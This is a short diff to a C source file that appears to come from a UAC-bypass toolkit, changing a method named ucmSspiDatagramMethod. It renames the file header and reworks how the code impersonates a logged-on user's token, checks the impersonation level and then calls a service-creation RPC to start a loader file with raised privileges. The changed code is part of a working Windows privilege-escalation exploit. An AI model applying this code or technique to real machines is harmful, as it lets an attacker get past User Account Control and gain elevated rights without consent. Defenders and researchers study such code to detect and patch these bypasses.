@@ -2,7 +2,7 @@
 *
 *  (C) COPYRIGHT AUTHORS, 2023
 *
-*  TITLE:       antonioCoco.C
+*  TITLE:       ANTONIOCOCO.C
 *
 *  VERSION:     3.65
 *
@@ -822,7 +822,8 @@ NTSTATUS ucmSspiDatagramMethod(
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bNeedCleanup = FALSE;
+    BOOL bNeedCleanup = FALSE, bImpersonate = FALSE;
+    SECURITY_IMPERSONATION_LEVEL impLevel;
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     HANDLE hToken = NULL;
     WCHAR szLoaderFileName[MAX_PATH * 2];
@@ -856,15 +857,23 @@ NTSTATUS ucmSspiDatagramMethod(
         if (!bNeedCleanup)
             break;
 
-        if (ImpersonateLoggedOnUser(hToken)) {
+        bImpersonate = ImpersonateLoggedOnUser(hToken);
+        if (!bImpersonate)
+            break;
 
-            if (ucmxInvokeCreateSvcRpcMain(szLoaderFileName))
-                MethodResult = STATUS_SUCCESS;
+        if (!supGetThreadTokenImpersonationLevel(NtCurrentThread(), &impLevel))
+            break;
 
-            RevertToSelf();
-        }
+        if (impLevel < SecurityImpersonation)
+            break;
+
+        if (ucmxInvokeCreateSvcRpcMain(szLoaderFileName))
+            MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
+
+    if (bImpersonate)
+        RevertToSelf();
 
     if (hToken)
         CloseHandle(hToken);
